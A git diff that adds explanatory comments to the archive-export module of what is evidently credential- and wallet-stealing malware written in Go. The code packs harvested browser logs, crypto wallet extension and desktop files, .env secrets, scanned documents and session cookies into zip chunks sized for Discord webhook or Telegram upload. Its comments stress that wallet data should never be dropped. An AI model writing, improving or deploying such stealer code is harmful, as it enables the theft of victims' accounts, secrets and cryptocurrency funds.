@@ -1,3 +1,11 @@
+// export.go — builds in-memory zip archives from a harvestPayload.
+//
+// Entries are either:
+//   - data: already-materialized bytes (text logs, JSON), or
+//   - diskPath: stream from disk at zip time (wallet LevelDB / desktop wallet files)
+//
+// zipArchiveEntriesChunked packs entries into zip parts that stay under maxBytes
+// (Discord ~8MB practical limit; Telegram allows larger).
 package main
 
 import (
@@ -16,12 +24,15 @@ import (
 // Discord webhooks return HTTP 413 above ~8MB in practice (multipart + embed overhead).
 const maxDiscordUpload = 8 * 1024 * 1024
 
+// archiveEntry is one zip member. Prefer data for small logs; diskPath for large trees.
 type archiveEntry struct {
 	zipPath  string
 	data     []byte
 	diskPath string
 }
 
+// buildPrimaryArchiveEntries assembles phase-1 content: browser/app logs, wallet
+// extension + desktop bundles, and .env files. Scanned documents/images are phase-2.
 func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
 	var entries []archiveEntry
 
@@ -65,6 +76,7 @@ func buildPrimaryArchiveEntries(p *harvestPayload) ([]archiveEntry, error) {
 	return entries, nil
 }
 
+// buildPrimaryZipChunks produces one or more zip blobs for the priority harvest upload.
 func buildPrimaryZipChunks(p *harvestPayload, maxChunk int) ([][]byte, error) {
 	entries, err := buildPrimaryArchiveEntries(p)
 	if err != nil {
@@ -76,6 +88,8 @@ func buildPrimaryZipChunks(p *harvestPayload, maxChunk int) ([][]byte, error) {
 	return zipArchiveEntriesChunked(entries, maxChunk)
 }
 
+// buildScannedFilesZipChunks packs phase-2 file scan results; skippedLarge is
+// how many files exceeded maxFileBytes and were left out.
 func buildScannedFilesZipChunks(p *harvestPayload, maxFileBytes int64, maxChunk int) ([][]byte, int, error) {
 	entries, skippedLarge := buildScannedFileEntries(p, maxFileBytes)
 	if len(entries) == 0 {
@@ -100,6 +114,7 @@ func walletFolderName(walletName, browser, profile string) string {
 	)
 }
 
+// uniqueFolder appends -2, -3, … when the same wallet/profile folder name collides.
 func uniqueFolder(base string, used map[string]int) string {
 	if used[base] == 0 {
 		used[base] = 1
@@ -109,6 +124,7 @@ func uniqueFolder(base string, used map[string]int) string {
 	return fmt.Sprintf("%s-%d", base, used[base])
 }
 
+// zipArchiveEntries writes all entries into a single zip. Missing disk files are skipped.
 func zipArchiveEntries(entries []archiveEntry) ([]byte, error) {
 	var buf bytes.Buffer
 	zw := zip.NewWriter(&buf)
@@ -147,6 +163,10 @@ func zipArchiveEntries(entries []archiveEntry) ([]byte, error) {
 	return buf.Bytes(), nil
 }
 
+// zipArchiveEntriesChunked greedily packs entries into zip parts under maxBytes.
+// If a single entry alone exceeds the limit it is still emitted as its own part
+// (upload may then fail; better than silently dropping wallet data).
+// Re-zips the trial batch each step because zip overhead varies with content.
 func zipArchiveEntriesChunked(entries []archiveEntry, maxBytes int) ([][]byte, error) {
 	if len(entries) == 0 {
 		return nil, fmt.Errorf("no files to zip")
@@ -184,6 +204,7 @@ func zipArchiveEntriesChunked(entries []archiveEntry, maxBytes int) ([][]byte, e
 				batch = []archiveEntry{entry}
 				continue
 			}
+			// Oversized single entry — still ship it.
 			chunks = append(chunks, z)
 			continue
 		}
@@ -198,6 +219,8 @@ func zipArchiveEntriesChunked(entries []archiveEntry, maxBytes int) ([][]byte, e
 	return chunks, nil
 }
 
+// splitBytesBySize splits large text blobs on newline boundaries when possible
+// so multi-part log files stay readable when rejoined.
 func splitBytesBySize(data []byte, max int) [][]byte {
 	if max <= 0 || len(data) <= max {
 		return [][]byte{data}
@@ -219,6 +242,8 @@ func splitBytesBySize(data []byte, max int) [][]byte {
 	return out
 }
 
+// cookiesNetscape formats cookies in Netscape/libcurl cookie file format
+// (usable by curl --cookie and many browser tools).
 func cookiesNetscape(p *harvestPayload) []byte {
 	if p == nil || p.Result == nil || len(p.Result.Cookies) == 0 {
 		return nil
